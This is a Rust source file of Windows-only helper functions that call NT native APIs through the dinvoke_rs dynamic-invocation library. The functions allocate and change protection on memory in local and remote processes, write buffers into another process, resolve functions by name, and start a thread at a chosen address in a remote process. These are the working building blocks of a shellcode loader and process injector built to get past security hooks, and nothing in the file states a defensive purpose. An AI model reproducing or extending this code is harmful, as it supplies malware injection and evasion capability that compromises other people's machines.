#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
use windows::Win32::Foundation::HANDLE;

#[cfg(target_os = "windows")]
pub unsafe fn nt_alloc(size: usize, protect: u32) -> Result<*mut c_void, String> {
    use dinvoke_rs::dinvoke;

    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size: usize = size;

    let status = dinvoke::nt_allocate_virtual_memory(
        HANDLE(-1),
        &mut base_address,
        0,
        &mut region_size,
        0x3000,
        protect,
    );

    if status == 0 {
        Ok(base_address)
    } else {
        Err(format!("NtAllocateVirtualMemory: 0x{:X}", status))
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_protect(addr: *mut c_void, size: usize, new_protect: u32) -> Result<u32, String> {
    use dinvoke_rs::dinvoke;

    let mut base = addr;
    let mut region_size = size;
    let mut old_protect: u32 = 0;

    let status = dinvoke::nt_protect_virtual_memory(
        HANDLE(-1),
        &mut base,
        &mut region_size,
        new_protect,
        &mut old_protect,
    );

    if status == 0 {
        Ok(old_protect)
    } else {
        Err(format!("NtProtectVirtualMemory: 0x{:X}", status))
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_write_memory(
    process: *mut c_void,
    addr: *mut c_void,
    buffer: &[u8],
) -> Result<usize, String> {
    use dinvoke_rs::dinvoke;

    let mut bytes_written: usize = 0;
    let status = dinvoke::nt_write_virtual_memory(
        HANDLE(process as isize),
        addr,
        buffer.as_ptr() as *mut c_void,
        buffer.len(),
        &mut bytes_written,
    );

    if status == 0 {
        Ok(bytes_written)
    } else {
        Err(format!("NtWriteVirtualMemory: 0x{:X}", status))
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_free(addr: *mut c_void) -> Result<(), String> {
    type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
    let vf: VirtualFreeFn = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree") {
        Some(p) => std::mem::transmute(p),
        None => return Err("VirtualFree resolve failed".to_string()),
    };
    let result = vf(addr, 0, 0x8000);
    if result != 0 { Ok(()) } else { Err("VirtualFree failed".to_string()) }
}

#[cfg(target_os = "windows")]
pub unsafe fn resolve_function(module: &str, function: &str) -> Option<usize> {
    use dinvoke_rs::dinvoke;

    let module_base = dinvoke::get_module_base_address(module);
    if module_base == 0 { return None; }

    let addr = dinvoke::get_function_address(module_base, function);
    if addr == 0 { None } else { Some(addr) }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_alloc_remote(process: *mut c_void, size: usize, protect: u32) -> Result<*mut c_void, String> {
    use dinvoke_rs::dinvoke;
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size: usize = size;
    let status = dinvoke::nt_allocate_virtual_memory(HANDLE(process as isize), &mut base_address, 0, &mut region_size, 0x3000, protect);
    if status == 0 { Ok(base_address) } else { Err(format!("NtAllocateVirtualMemory remote: 0x{:X}", status)) }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_protect_remote(process: *mut c_void, addr: *mut c_void, size: usize, new_protect: u32) -> Result<u32, String> {
    use dinvoke_rs::dinvoke;
    let mut base = addr;
    let mut region_size = size;
    let mut old_protect: u32 = 0;
    let status = dinvoke::nt_protect_virtual_memory(HANDLE(process as isize), &mut base, &mut region_size, new_protect, &mut old_protect);
    if status == 0 { Ok(old_protect) } else { Err(format!("NtProtectVirtualMemory remote: 0x{:X}", status)) }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_create_thread(process: *mut c_void, start_address: *mut c_void) -> Result<*mut c_void, String> {
    use dinvoke_rs::dinvoke;
    let mut thread_handle: HANDLE = HANDLE(0);
    let status = dinvoke::nt_create_thread_ex(
        &mut thread_handle, 0x1FFFFF, std::ptr::null_mut(),
        HANDLE(process as isize), start_address, std::ptr::null_mut(),
        0, 0, 0, 0, std::ptr::null_mut(),
    );
    if status == 0 { Ok(thread_handle.0 as *mut c_void) } else { Err(format!("NtCreateThreadEx: 0x{:X}", status)) }
}
